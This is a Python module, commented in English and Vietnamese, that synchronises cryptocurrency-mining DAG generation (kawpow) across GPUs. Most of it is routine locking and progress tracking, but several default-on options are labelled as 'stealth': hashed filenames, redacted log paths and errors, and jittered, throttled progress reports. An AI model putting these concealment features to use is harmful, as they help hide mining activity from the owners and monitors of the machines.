#!/usr/bin/env python3
"""
DAG Calculation Synchronization Module
Module đồng bộ tính toán DAG giữa các GPU

This module provides synchronization mechanisms for DAG (Directed Acyclic Graph) 
calculations across multiple GPUs to prevent duplicate computations and ensure
efficient resource utilization.

Module này cung cấp cơ chế đồng bộ cho tính toán DAG (Đồ thị có hướng không chu trình)
giữa nhiều GPU để tránh tính toán trùng lặp và đảm bảo sử dụng tài nguyên hiệu quả.
"""

import os
import time
import json
import threading
import multiprocessing as mp
from pathlib import Path
from typing import Dict, Optional, List, Tuple, Any
from dataclasses import dataclass, asdict
from enum import Enum
import hashlib
import fcntl
import mmap
import struct
from contextlib import contextmanager

# Import logging from existing module
try:
    from .module_loggers import get_gpu_optimization_logger
    logger = get_gpu_optimization_logger()
except ImportError:
    try:
        # Fallback to direct import for standalone testing
        from module_loggers import get_gpu_optimization_logger
        logger = get_gpu_optimization_logger()
    except ImportError:
        # Final fallback to basic logging
        import logging
        logger = logging.getLogger(__name__)
        logger.setLevel(logging.INFO)

# SSOT GPU provider import (nhà cung cấp số liệu GPU thống nhất)
try:
    from .resource_control import GPUResourceManager
except ImportError:
    try:
        from resource_control import GPUResourceManager
    except ImportError:  # Fallback khi chạy standalone không có module
        GPUResourceManager = None  # type: ignore

class DAGState(Enum):
    """DAG calculation states (trạng thái tính toán DAG)"""
    NOT_STARTED = "not_started"  # Chưa bắt đầu
    IN_PROGRESS = "in_progress"  # Đang tiến hành
    COMPLETED = "completed"      # Đã hoàn thành
    FAILED = "failed"           # Thất bại
    CACHED = "cached"           # Đã lưu cache

@dataclass
class DAGInfo:
    """DAG information structure (cấu trúc thông tin DAG)"""
    epoch: int                  # Epoch number (số epoch)
    algorithm: str              # Mining algorithm (thuật toán khai thác)
    state: DAGState            # Current state (trạng thái hiện tại)
    progress: float            # Progress percentage (phần trăm tiến độ)
    gpu_id: int                # GPU calculating DAG (GPU đang tính DAG)
    file_path: Optional[str]   # DAG file path (đường dẫn file DAG)
    size_bytes: int            # DAG size in bytes (kích thước DAG)
    hash: Optional[str]        # DAG hash for verification (hash DAG để xác minh)
    start_time: float          # Calculation start time (thời gian bắt đầu)
    end_time: Optional[float]  # Calculation end time (thời gian kết thúc)
    error: Optional[str]       # Error message if failed (thông báo lỗi nếu thất bại)

class DAGSynchronizer:
    """
    DAG Synchronization Manager
    Quản lý đồng bộ DAG giữa các GPU
    
    Features (Tính năng):
    - Shared DAG cache (cache DAG dùng chung)
    - Progress tracking (theo dõi tiến độ)
    - Lock-based synchronization (đồng bộ dựa trên khóa)
    - Multi-GPU coordination (phối hợp đa GPU)
    """
    
    def __init__(self, cache_dir: str = None):
        """
        Initialize DAG synchronizer
        Khởi tạo bộ đồng bộ DAG
        
        Args:
            cache_dir: Directory for DAG cache (thư mục cho cache DAG)
        """
        if cache_dir is None:
            cache_dir = os.getenv('LOGS_DIR', '/app/mining_environment/logs') + '/dag_cache'
        self.cache_dir = Path(cache_dir)
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        
        # Shared memory for DAG state
        self.shm_name = "dag_sync_state"
        self.shm_size = 65536  # 64KB for state data
        
        # File locks for synchronization
        self.lock_file = self.cache_dir / "dag_sync.lock"
        self.state_file = self.cache_dir / "dag_state.json"
        
        # Local cache
        self.dag_cache: Dict[str, DAGInfo] = {}
        self.cache_lock = threading.Lock()
        
        # GPU assignment tracking
        self.gpu_assignments: Dict[int, str] = {}  # gpu_id -> dag_key
        
        logger.info(f"🔄 DAG Synchronizer initialized (cache: {self.cache_dir})")
    
    def _get_dag_key(self, epoch: int, algorithm: str) -> str:
        """
        Generate unique DAG key
        Tạo khóa DAG duy nhất
        """
        return f"{algorithm}_{epoch}"
    
    def _get_dag_file_path(self, epoch: int, algorithm: str) -> Path:
        """
        Get DAG file path
        Lấy đường dẫn file DAG
        """
        obfuscate = os.getenv('DAG_FILE_OBFUSCATE', '1').lower() in ('1','true','yes')
        if obfuscate:
            # Use hash-based filename to increase stealth
            salt = os.getenv('DAG_FILE_SALT', 'dag_salt')
            hexname = hashlib.sha256(f"{algorithm}|{epoch}|{salt}".encode()).hexdigest()
            return self.cache_dir / f"{hexname}.dag"
        return self.cache_dir / f"{algorithm}_epoch_{epoch}.dag"
    
    @contextmanager
    def _file_lock(self, exclusive: bool = True):
        """
        File-based lock for process synchronization
        Khóa dựa trên file để đồng bộ tiến trình
        """
        lock_fd = None
        try:
            lock_fd = open(self.lock_file, 'w')
            lock_type = fcntl.LOCK_EX if exclusive else fcntl.LOCK_SH
            fcntl.flock(lock_fd, lock_type)
            yield
        finally:
            if lock_fd:
                fcntl.flock(lock_fd, fcntl.LOCK_UN)
                lock_fd.close()
    
    def _load_state(self) -> Dict[str, DAGInfo]:
        """
        Load DAG state from persistent storage
        Tải trạng thái DAG từ lưu trữ bền vững
        """
        if not self.state_file.exists():
            return {}
        
        try:
            with open(self.state_file, 'r') as f:
                data = json.load(f)
                
            state = {}
            for key, info_dict in data.items():
                info_dict['state'] = DAGState(info_dict['state'])
                state[key] = DAGInfo(**info_dict)
            
            return state
        except Exception as e:
            logger.error(f"❌ Failed to load DAG state (tải trạng thái DAG thất bại – lỗi đọc file): {e}")
            return {}
    
    def _save_state(self, state: Dict[str, DAGInfo]):
        """
        Save DAG state to persistent storage
        Lưu trạng thái DAG vào lưu trữ bền vững
        """
        try:
            data = {}
            for key, info in state.items():
                info_dict = asdict(info)
                info_dict['state'] = info.state.value
                # Optional redaction for stealth logs
                if os.getenv('DAG_LOG_REDACTION', '1').lower() in ('1','true','yes'):
                    # Remove/shorten potentially sensitive paths and errors
                    if 'file_path' in info_dict and info_dict['file_path']:
                        p = Path(info_dict['file_path'])
                        info_dict['file_path'] = str(p.name)
                    if info_dict.get('error'):
                        info_dict['error'] = 'redacted'
                data[key] = info_dict
            # Atomic write
            tmp_path = self.state_file.with_suffix('.json.tmp')
            with open(tmp_path, 'w') as f:
                json.dump(data, f, indent=2)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, self.state_file)
        except Exception as e:
            logger.error(f"❌ Failed to save DAG state (lưu trạng thái DAG thất bại – lỗi ghi file): {e}")
    
    def register_dag_calculation(self, epoch: int, algorithm: str, gpu_id: int) -> bool:
        """
        Register GPU for DAG calculation
        Đăng ký GPU để tính toán DAG
        
        Returns:
            True if GPU should calculate DAG, False if already being calculated
            True nếu GPU nên tính DAG, False nếu đã đang được tính
        """
        dag_key = self._get_dag_key(epoch, algorithm)
        
        with self._file_lock():
            state = self._load_state()
            
            # Check if DAG already exists or is being calculated
            if dag_key in state:
                info = state[dag_key]
                
                if info.state == DAGState.COMPLETED:
                    logger.info(f"✅ DAG {dag_key} already completed (GPU {info.gpu_id})")
                    return False
                
                elif info.state == DAGState.IN_PROGRESS:
                    # Check if calculation is stale (> 5 minutes)
                    if time.time() - info.start_time > 300:
                        logger.warning(f"⚠️ DAG {dag_key} calculation stale (tính toán DAG bị treo – dữ liệu cũ), taking over (tiếp quản)")
                    else:
                        logger.info(f"⏳ DAG {dag_key} already in progress (GPU {info.gpu_id})")
                        return False
            
            # Register this GPU for DAG calculation
            info = DAGInfo(
                epoch=epoch,
                algorithm=algorithm,
                state=DAGState.IN_PROGRESS,
                progress=0.0,
                gpu_id=gpu_id,
                file_path=str(self._get_dag_file_path(epoch, algorithm)),
                size_bytes=0,
                hash=None,
                start_time=time.time(),
                end_time=None,
                error=None
            )
            
            state[dag_key] = info
            self._save_state(state)
            
            # Update local cache
            with self.cache_lock:
                self.dag_cache[dag_key] = info
                self.gpu_assignments[gpu_id] = dag_key
            
            logger.info(f"📝 GPU {gpu_id} registered for DAG {dag_key} calculation")
            return True
    
    def update_progress(self, epoch: int, algorithm: str, gpu_id: int, progress: float):
        """
        Update DAG calculation progress
        Cập nhật tiến độ tính toán DAG
        """
        dag_key = self._get_dag_key(epoch, algorithm)
        
        with self._file_lock():
            state = self._load_state()
            
            if dag_key in state and state[dag_key].gpu_id == gpu_id:
                # Rate limit & jitter for stealth
                if os.getenv('DAG_STEALTH_PROGRESS', '1').lower() in ('1','true','yes'):
                    try:
                        last = float(state[dag_key].progress)
                    except Exception:
                        last = 0.0
                    # Only update if progressed ≥ 5%
                    if progress - last < 5.0:
                        return
                    # Add tiny jitter ±1%
                    try:
                        jitter = (hash(progress) % 3) - 1  # -1,0,1
                        progress = max(0.0, min(100.0, progress + jitter))
                    except Exception:
                        pass
                state[dag_key].progress = progress
                self._save_state(state)
                
                # Update local cache
                with self.cache_lock:
                    if dag_key in self.dag_cache:
                        self.dag_cache[dag_key].progress = progress
                # Reduce progress log verbosity
                if os.getenv('DAG_STEALTH_PROGRESS', '1').lower() in ('1','true','yes'):
                    if int(progress) % 10 == 0:
                        logger.info(f"⏳ DAG {dag_key} progressed ~{int(progress)}% (GPU {gpu_id})")
                else:
                    logger.debug(f"📊 DAG {dag_key} progress: {progress:.1f}% (GPU {gpu_id})")
    
    def complete_calculation(self, epoch: int, algorithm: str, gpu_id: int, 
                           file_path: str, size_bytes: int, dag_hash: str):
        """
        Mark DAG calculation as completed
        Đánh dấu tính toán DAG đã hoàn thành
        """
        dag_key = self._get_dag_key(epoch, algorithm)
        
        with self._file_lock():
            state = self._load_state()
            
            if dag_key in state and state[dag_key].gpu_id == gpu_id:
                info = state[dag_key]
                info.state = DAGState.COMPLETED
                info.progress = 100.0
                info.file_path = file_path
                info.size_bytes = size_bytes
                info.hash = dag_hash
                info.end_time = time.time()
                
                self._save_state(state)
                
                # Update local cache
                with self.cache_lock:
                    self.dag_cache[dag_key] = info
                    if gpu_id in self.gpu_assignments:
                        del self.gpu_assignments[gpu_id]
                
                duration = info.end_time - info.start_time
                logger.info(f"✅ DAG {dag_key} completed by GPU {gpu_id} "
                          f"({size_bytes/1024/1024:.1f}MB in {duration:.1f}s)")
    
    def fail_calculation(self, epoch: int, algorithm: str, gpu_id: int, error: str):
        """
        Mark DAG calculation as failed
        Đánh dấu tính toán DAG đã thất bại
        """
        dag_key = self._get_dag_key(epoch, algorithm)
        
        with self._file_lock():
            state = self._load_state()
            
            if dag_key in state and state[dag_key].gpu_id == gpu_id:
                info = state[dag_key]
                info.state = DAGState.FAILED
                info.end_time = time.time()
                info.error = error
                
                self._save_state(state)
                
                # Update local cache
                with self.cache_lock:
                    self.dag_cache[dag_key] = info
                    if gpu_id in self.gpu_assignments:
                        del self.gpu_assignments[gpu_id]
                
                logger.error(f"❌ DAG {dag_key} failed on GPU {gpu_id} (tính DAG thất bại – lỗi thực thi): {error}")
    
    def get_dag_info(self, epoch: int, algorithm: str) -> Optional[DAGInfo]:
        """
        Get DAG information
        Lấy thông tin DAG
        """
        dag_key = self._get_dag_key(epoch, algorithm)
        
        # Check local cache first
        with self.cache_lock:
            if dag_key in self.dag_cache:
                return self.dag_cache[dag_key]
        
        # Load from persistent storage
        with self._file_lock(exclusive=False):
            state = self._load_state()
            return state.get(dag_key)
    
    def wait_for_dag(self, epoch: int, algorithm: str, timeout: float = 300) -> bool:
        """
        Wait for DAG to be ready
        Đợi DAG sẵn sàng
        
        Returns:
            True if DAG is ready, False if timeout
            True nếu DAG sẵn sàng, False nếu hết thời gian
        """
        dag_key = self._get_dag_key(epoch, algorithm)
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            info = self.get_dag_info(epoch, algorithm)
            
            if info and info.state == DAGState.COMPLETED:
                logger.info(f"✅ DAG {dag_key} ready (waited {time.time()-start_time:.1f}s)")
                return True
            
            elif info and info.state == DAGState.FAILED:
                logger.error(f"❌ DAG {dag_key} failed: {info.error}")
                return False
            
            # Log progress periodically
            if info and info.state == DAGState.IN_PROGRESS:
                logger.debug(f"⏳ Waiting for DAG {dag_key}: {info.progress:.1f}%")
            
            time.sleep(1)  # Check every second
        
        logger.error(f"⏱️ Timeout waiting for DAG {dag_key} (hết thời gian chờ DAG – timeout đợi DAG)")
        return False
    
    def cleanup_old_dags(self, max_age_hours: int = 24):
        """
        Clean up old DAG files
        Dọn dẹp file DAG cũ
        """
        current_time = time.time()
        max_age_seconds = max_age_hours * 3600
        
        with self._file_lock():
            state = self._load_state()
            keys_to_remove = []
            
            for key, info in state.items():
                if info.end_time and current_time - info.end_time > max_age_seconds:
                    keys_to_remove.append(key)
                    
                    # Delete DAG file if exists
                    if info.file_path and Path(info.file_path).exists():
                        try:
                            Path(info.file_path).unlink()
                            logger.info(f"🗑️ Deleted old DAG file: {info.file_path}")
                        except Exception as e:
                            logger.error(f"❌ Failed to delete DAG file: {e}")
            
            # Remove from state
            for key in keys_to_remove:
                del state[key]
            
            self._save_state(state)
            
            # Update local cache
            with self.cache_lock:
                for key in keys_to_remove:
                    self.dag_cache.pop(key, None)
            
            if keys_to_remove:
                logger.info(f"🧹 Cleaned up {len(keys_to_remove)} old DAG entries")
    
    def get_status_summary(self) -> Dict[str, Any]:
        """
        Get summary of all DAG statuses
        Lấy tóm tắt trạng thái tất cả DAG
        """
        with self._file_lock(exclusive=False):
            state = self._load_state()
        
        summary = {
            'total': len(state),
            'completed': 0,
            'in_progress': 0,
            'failed': 0,
            'cached': 0,
            'active_gpus': [],
            'dags': []
        }
        
        for key, info in state.items():
            if info.state == DAGState.COMPLETED:
                summary['completed'] += 1
            elif info.state == DAGState.IN_PROGRESS:
                summary['in_progress'] += 1
                summary['active_gpus'].append(info.gpu_id)
            elif info.state == DAGState.FAILED:
                summary['failed'] += 1
            elif info.state == DAGState.CACHED:
                summary['cached'] += 1
            
            summary['dags'].append({
                'key': key,
                'epoch': info.epoch,
                'algorithm': info.algorithm,
                'state': info.state.value,
                'progress': info.progress,
                'gpu_id': info.gpu_id,
                'size_mb': info.size_bytes / 1024 / 1024 if info.size_bytes else 0
            })
        
        return summary

# Global instance
_dag_synchronizer: Optional[DAGSynchronizer] = None

def get_dag_synchronizer() -> DAGSynchronizer:
    """
    Get global DAG synchronizer instance
    Lấy instance bộ đồng bộ DAG toàn cục
    """
    global _dag_synchronizer
    if _dag_synchronizer is None:
        _dag_synchronizer = DAGSynchronizer()
    return _dag_synchronizer

class _DAGPrefetcher:
    """
    Background prefetch scheduler for next-epoch DAG
    Bộ lập lịch prefetch DAG cho epoch kế tiếp – giữ hashrate ≥ 80%
    """
    def __init__(self, synchronizer: DAGSynchronizer):
        self.sync = synchronizer
        self.thread: Optional[threading.Thread] = None
        self.stop = threading.Event()
        self.active = False
        # Lazy GPUResourceManager instance (khởi tạo lười biếng)
        self._grm: Optional["GPUResourceManager"] = None  # type: ignore[name-defined]

    def _get_grm(self) -> "GPUResourceManager":  # type: ignore[name-defined]
        """
        Lazy-initialize and return GPUResourceManager (khởi tạo lười biếng và trả về GRM).
        Dùng làm SSOT cho metrics để guard prefetch theo utilization.
        """
        if self._grm is not None:
            return self._grm
        if GPUResourceManager is None:
            raise RuntimeError("GPUResourceManager not available (module import failed)")
        cfg: Dict[str, Any] = {}
        self._grm = GPUResourceManager(cfg, logger)
        return self._grm

    def start(self):
        enable = os.getenv('DAG_PREFETCH_ENABLE', '1').lower() in ('1','true','yes')
        if not enable or self.active:
            return
        self.active = True
        self.thread = threading.Thread(target=self._run, name='DAGPrefetcher', daemon=True)
        self.thread.start()

    def _get_next_epoch(self) -> Optional[int]:
        try:
            # Simple heuristic: read current epoch from status file if exists, else None
            state = self.sync._load_state()
            # pick the max epoch of current entries and add 1
            if state:
                epochs = [info.epoch for info in state.values() if isinstance(info, DAGInfo)]
                if epochs:
                    return max(epochs) + 1
        except Exception:
            pass
        return None

    def _run(self):
        ahead_sec = int(os.getenv('DAG_PREFETCH_AHEAD_SEC', '600'))
        util_guard = float(os.getenv('DAG_PREFETCH_UTIL_GUARD', '0.8'))
        algorithm = os.getenv('DAG_ALGO', 'kawpow')
        gpu_id = int(os.getenv('DAG_PREFETCH_GPU_ID', '0'))

        while not self.stop.is_set():
            try:
                # Guard: check utilization via SSOT GPUResourceManager if available
                allow_under_80 = os.getenv('ALLOW_UTIL_UNDER_80', '0').lower() in ('1','true','yes')
                if not allow_under_80:
                    try:
                        grm = self._get_grm()
                        snapshot = grm.get_metrics_snapshot(ttl_sec=None)
                        util = float(snapshot.utilization.get(gpu_id, 0.0))
                        if util < util_guard:
                            time.sleep(5)
                            continue
                    except Exception:
                        # If provider not available, proceed cautiously
                        pass

                # Prefetch next epoch if any
                next_epoch = self._get_next_epoch()
                if next_epoch is not None:
                    # Prefetch only if not present
                    info = self.sync.get_dag_info(next_epoch, algorithm)
                    if not info or info.state != DAGState.COMPLETED:
                        def _dummy_calc(ep, algo, cb):
                            # Placeholder calculate_fn for prefetch integration – user miner binary should handle real building
                            dag_path = str(self.sync._get_dag_file_path(ep, algo))
                            # Create sparse file to mark reservation; real miner will overwrite when it actually builds
                            Path(dag_path).touch(exist_ok=True)
                            for p in (10, 25, 50, 75, 100):
                                cb(float(p))
                                time.sleep(0.2)
                            size_bytes = 0
                            dag_hash = hashlib.sha256(f"{algo}|{ep}".encode()).hexdigest()
                            return dag_path, size_bytes, dag_hash
                        try:
                            logger.info(f"🚀 [DAG-PREFETCH] Prefetching DAG for {algorithm} epoch {next_epoch} on GPU {gpu_id}")
                            synchronize_dag_calculation(next_epoch, algorithm, gpu_id, _dummy_calc)
                        except Exception as _e:
                            logger.debug(f"[DAG-PREFETCH] Prefetch attempt failed: {_e}")
                time.sleep(5)
            except Exception as e:
                logger.debug(f"[DAG-PREFETCH] loop error: {e}")
                time.sleep(5)

_dag_prefetcher: Optional[_DAGPrefetcher] = None

def synchronize_dag_calculation(epoch: int, algorithm: str, gpu_id: int,
                               calculate_fn: callable) -> Tuple[bool, Optional[str]]:
    """
    Synchronize DAG calculation across GPUs
    Đồng bộ tính toán DAG giữa các GPU
    
    Args:
        epoch: Epoch number (số epoch)
        algorithm: Mining algorithm (thuật toán khai thác)
        gpu_id: GPU ID (ID GPU)
        calculate_fn: Function to calculate DAG (hàm tính toán DAG)
    
    Returns:
        (success, dag_file_path)
    """
    synchronizer = get_dag_synchronizer()
    # Ensure background prefetcher is running if enabled
    global _dag_prefetcher
    if _dag_prefetcher is None:
        _dag_prefetcher = _DAGPrefetcher(synchronizer)
        _dag_prefetcher.start()
    
    # Check if we should calculate or wait
    should_calculate = synchronizer.register_dag_calculation(epoch, algorithm, gpu_id)
    
    if should_calculate:
        # This GPU will calculate the DAG
        logger.info(f"🚀 GPU {gpu_id} starting DAG calculation for {algorithm} epoch {epoch}")
        
        try:
            # Call the calculation function with progress callback
            def progress_callback(progress: float):
                synchronizer.update_progress(epoch, algorithm, gpu_id, progress)
            
            dag_file_path, size_bytes, dag_hash = calculate_fn(
                epoch, algorithm, progress_callback
            )
            
            # Mark as completed
            synchronizer.complete_calculation(
                epoch, algorithm, gpu_id, dag_file_path, size_bytes, dag_hash
            )
            
            return True, dag_file_path
            
        except Exception as e:
            # Mark as failed
            synchronizer.fail_calculation(epoch, algorithm, gpu_id, str(e))
            return False, None
    
    else:
        # Wait for another GPU to calculate
        logger.info(f"⏳ GPU {gpu_id} waiting for DAG from another GPU")
        
        if synchronizer.wait_for_dag(epoch, algorithm):
            info = synchronizer.get_dag_info(epoch, algorithm)
            if info and info.file_path:
                logger.info(f"✅ GPU {gpu_id} using DAG from GPU {info.gpu_id}")
                return True, info.file_path
        
        return False, None

if __name__ == "__main__":
    # Test module
    logger.info("🧪 Testing DAG Synchronization module...")
    
    synchronizer = get_dag_synchronizer()
    
    # Test registration
    epoch = 529
    algorithm = "kawpow"
    
    # Simulate multiple GPUs
    for gpu_id in range(2):
        should_calc = synchronizer.register_dag_calculation(epoch, algorithm, gpu_id)
        logger.info(f"GPU {gpu_id} should calculate: {should_calc}")
    
    # Get status
    status = synchronizer.get_status_summary()
    logger.info(f"📊 Status: {json.dumps(status, indent=2)}")
    
    # Clean up old DAGs
    synchronizer.cleanup_old_dags(max_age_hours=1)
    
    logger.info("✅ DAG Synchronization test completed")
